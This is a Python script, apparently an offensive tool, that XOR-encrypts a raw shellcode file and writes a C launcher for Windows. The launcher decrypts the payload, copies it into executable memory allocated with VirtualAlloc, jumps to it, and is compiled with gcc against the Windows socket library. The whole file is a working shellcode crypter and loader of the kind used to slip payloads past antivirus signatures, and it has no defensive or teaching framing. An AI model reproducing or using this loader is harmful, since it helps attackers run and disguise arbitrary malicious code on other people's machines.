import os
import sys
import random
import struct
import argparse
from base64 import b64encode
from base64 import b64decode

def XORShellGen(shellcode_file, key):
    """
    Generates an XOR-encrypted shellcode and C launcher.

    Args:
        shellcode_file (str): Path to the file containing the raw shellcode.
        key (int):  The integer value to use as the XOR key.
    """

    try:
        with open(shellcode_file, "rb") as f:
            shellcode = f.read()
    except FileNotFoundError:
        print(f"Error: Shellcode file not found: {shellcode_file}")
        sys.exit(1)

    encrypted_shellcode = bytearray()
    for byte in shellcode:
        encrypted_shellcode.append(byte ^ key)

    # Convert to a C-compatible byte array representation
    shellcode_str = ", ".join(f"0x{byte:02x}" for byte in encrypted_shellcode)
    shellcode_length = len(encrypted_shellcode)

    c_code = f"""
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

unsigned char shellcode[] = {{ {shellcode_str} }};
unsigned int shellcode_len = {shellcode_length};
unsigned char key = {key};

int main() {{
    unsigned char *decrypted_shellcode = (unsigned char *)malloc(shellcode_len);
    if (decrypted_shellcode == NULL) {{
        printf("Memory allocation failed.\\n");
        return 1;
    }}

    // XOR decryption
    for (int i = 0; i < shellcode_len; i++) {{
        decrypted_shellcode[i] = shellcode[i] ^ key;
    }}

    // Allocate executable memory
    void *exec_mem = VirtualAlloc(0, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {{
        printf("VirtualAlloc failed.\\n");
        return 1;
    }}

    // Copy shellcode to executable memory
    memcpy(exec_mem, decrypted_shellcode, shellcode_len);

    // Execute shellcode
    ((void (*)())exec_mem)();

    free(decrypted_shellcode); // Free the allocated memory

    return 0;
}}
"""

    c_file_name = "launcher.c"
    exe_file_name = "launcher.exe"

    try:
        with open(c_file_name, "w") as f:
            f.write(c_code)

        print(f"C code saved to {c_file_name}")

        # Compile the C code using MinGW
        compile_command = f"gcc -o {exe_file_name} {c_file_name} -lws2_32"  # Link with ws2_32 for network functions (if shellcode uses it)
        os.system(compile_command)  # Execute command in shell

        print(f"Executable created: {exe_file_name}")

    except Exception as e:
        print(f"An error occurred: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XOR Shellcode Generator and C Launcher Creator")
    parser.add_argument("shellcode_file", help="Path to the raw shellcode file")
    parser.add_argument("-k", "--key", type=int, default=42, help="XOR key (integer, default: 42)")
    args = parser.parse_args()

    XORShellGen(args.shellcode_file, args.key)
